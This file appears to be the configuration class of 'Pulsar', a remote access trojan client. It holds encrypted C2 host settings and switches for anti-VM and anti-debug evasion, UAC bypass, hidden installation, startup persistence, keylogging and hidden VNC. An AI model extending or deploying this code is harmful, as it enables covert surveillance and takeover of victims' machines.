using Pulsar.Common.Cryptography;
using Pulsar.Common.Models;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace Pulsar.Client.Config
{
    /// <summary>
    /// Stores the configuration of the client.
    /// </summary>
    public static class Settings
    {
#if DEBUG
        public static string VERSION = "1.0.0";
        public static string HOSTS = "127.0.0.1:4782;";
        public static int RECONNECTDELAY = 500;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "Test";
        public static string INSTALLNAME = "test.exe";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
        public static string STARTUPKEY = "Pulsar Client Startup";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "DEBUG";
        public static string LOGDIRECTORYNAME = "Logs";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static string AESE2EKEY = "";
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool ANTIVM = false;
        public static bool ANTIDEBUG = false;
        public static bool PASTEBIN = false;
        public static bool UACBYPASS = false;
        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)

        // needed for hvnc
        public static IntPtr OriginalDesktopPointer = IntPtr.Zero;

        public static bool Initialize()
        {
            SetupPaths();
            return true;
        }
#else
        public static string VERSION = "";
        public static string HOSTS = "";
        public static int RECONNECTDELAY = 5000;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "";
        public static string INSTALLNAME = "";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "";
        public static string STARTUPKEY = "";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "";
        public static string LOGDIRECTORYNAME = "";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static string AESE2EKEY = "";
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool ANTIVM = false;
        public static bool ANTIDEBUG = false;
        public static bool PASTEBIN = false;
        public static bool UACBYPASS = false;
        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)

        // needed for hvnc
        public static IntPtr OriginalDesktopPointer = IntPtr.Zero;

        public static bool Initialize()
        {
            if (string.IsNullOrEmpty(VERSION)) return false;
            var aes = new Aes256(ENCRYPTIONKEY);
            TAG = aes.Decrypt(TAG);
            VERSION = aes.Decrypt(VERSION);
            HOSTS = aes.Decrypt(HOSTS);
            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
            INSTALLNAME = aes.Decrypt(INSTALLNAME);
            MUTEX = aes.Decrypt(MUTEX);
            STARTUPKEY = aes.Decrypt(STARTUPKEY);
            LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
            
            if (!string.IsNullOrEmpty(AESE2EKEY))
            {
                AESE2EKEY = aes.Decrypt(AESE2EKEY);
            }
            SetupPaths();
            return VerifyHash();
        }
#endif

        static void SetupPaths()
        {
            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
        }

        static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider)SERVERCERTIFICATE.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
                    Convert.FromBase64String(SERVERSIGNATURE));

            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
